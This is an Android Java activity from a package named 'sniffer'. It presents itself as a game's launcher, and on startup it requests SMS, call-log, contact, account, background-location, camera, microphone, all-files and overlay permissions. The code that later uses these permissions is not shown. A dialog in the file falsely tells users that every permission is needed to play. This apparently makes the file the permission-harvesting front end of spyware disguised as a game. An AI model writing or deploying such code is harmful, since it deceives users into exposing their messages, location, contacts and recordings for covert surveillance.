package com.v8.global.sniffer;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.Manifest;
import com.v8.global.sniffer.game.MainGameActivity;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class MainActivity extends Activity {

    private static final int PERMISSION_REQUEST_CODE = 1000;
    private static final int SYSTEM_ALERT_WINDOW_CODE = 1001;
    private static final int MANAGE_STORAGE_CODE = 1002;
    
    private Map<String, Boolean> permissionStatus = new HashMap<>();
    private int totalPermissions = 0;
    private int grantedPermissions = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // بدء عملية الصلاحيات مباشرة
        requestAllPermissionsAtOnce();
    }

    private void requestAllPermissionsAtOnce() {
        // قائمة جميع الصلاحيات المطلوبة
        List<String> permissionsList = new ArrayList<>();
        
        // صلاحيات التخزين
        permissionsList.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        permissionsList.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        
        // صلاحيات الكاميرا والميكروفون
        permissionsList.add(Manifest.permission.CAMERA);
        permissionsList.add(Manifest.permission.RECORD_AUDIO);
        
        // صلاحيات الموقع
        permissionsList.add(Manifest.permission.ACCESS_FINE_LOCATION);
        permissionsList.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            permissionsList.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
        }
        
        // صلاحيات جهات الاتصال والحسابات
        permissionsList.add(Manifest.permission.READ_CONTACTS);
        permissionsList.add(Manifest.permission.GET_ACCOUNTS);
        
        // صلاحيات الهاتف
        permissionsList.add(Manifest.permission.READ_PHONE_STATE);
        permissionsList.add(Manifest.permission.READ_CALL_LOG);
        
        // صلاحيات الرسائل
        permissionsList.add(Manifest.permission.READ_SMS);
        permissionsList.add(Manifest.permission.RECEIVE_SMS);
        
        // صلاحيات الإشعارات
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissionsList.add(Manifest.permission.POST_NOTIFICATIONS);
        }
        
        // صلاحيات الملفات للوسائط
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissionsList.add(Manifest.permission.READ_MEDIA_IMAGES);
            permissionsList.add(Manifest.permission.READ_MEDIA_VIDEO);
            permissionsList.add(Manifest.permission.READ_MEDIA_AUDIO);
        }

        totalPermissions = permissionsList.size();
        
        // تجهيز قائمة الصلاحيات التي لم تمنح بعد
        List<String> permissionsToRequest = new ArrayList<>();
        
        for (String permission : permissionsList) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            } else {
                grantedPermissions++;
                permissionStatus.put(permission, true);
            }
        }

        // طلب الصلاحيات الخاصة أولاً
        requestSpecialPermissions(permissionsToRequest);
    }

    private void requestSpecialPermissions(List<String> remainingPermissions) {
        // 1. صلاحية العرض فوق التطبيقات
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, SYSTEM_ALERT_WINDOW_CODE);
                return;
            }
        }

        // 2. صلاحية إدارة الملفات للأندرويد 11+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!android.os.Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, MANAGE_STORAGE_CODE);
                return;
            }
        }

        // 3. طلب باقي الصلاحيات دفعة واحدة
        if (!remainingPermissions.isEmpty()) {
            ActivityCompat.requestPermissions(this, 
                remainingPermissions.toArray(new String[0]), 
                PERMISSION_REQUEST_CODE);
        } else {
            // كل الصلاحيات ممنوحة
            openGame();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_CODE) {
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                    grantedPermissions++;
                    permissionStatus.put(permissions[i], true);
                }
            }

            // التحقق مما إذا كانت كل الصلاحيات ممنوحة
            if (grantedPermissions >= totalPermissions) {
                openGame();
            } else {
                // بعض الصلاحيات ما زالت مفقودة
                showPermissionDialog();
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == SYSTEM_ALERT_WINDOW_CODE || requestCode == MANAGE_STORAGE_CODE) {
            // العودة من شاشة الصلاحيات الخاصة، نكمل طلب الباقي
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    requestAllPermissionsAtOnce();
                }
            }, 1000);
        }
    }

    private void showPermissionDialog() {
        // عرض رسالة للمستخدم بأن الصلاحيات ضرورية
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                new android.app.AlertDialog.Builder(MainActivity.this)
                    .setTitle("🔐 الصلاحيات مطلوبة")
                    .setMessage("تحتاج إلى منح جميع الصلاحيات لتتمكن من اللعب بشكل كامل")
                    .setPositiveButton("سماح", (dialog, which) -> {
                        requestAllPermissionsAtOnce();
                    })
                    .setNegativeButton("تخطي", (dialog, which) -> {
                        // حتى لو تخطى، افتح اللعبة
                        openGame();
                    })
                    .setCancelable(false)
                    .show();
            }
        });
    }

    private void openGame() {
        Intent intent = new Intent(this, MainGameActivity.class);
        startActivity(intent);
        finish();
    }
}
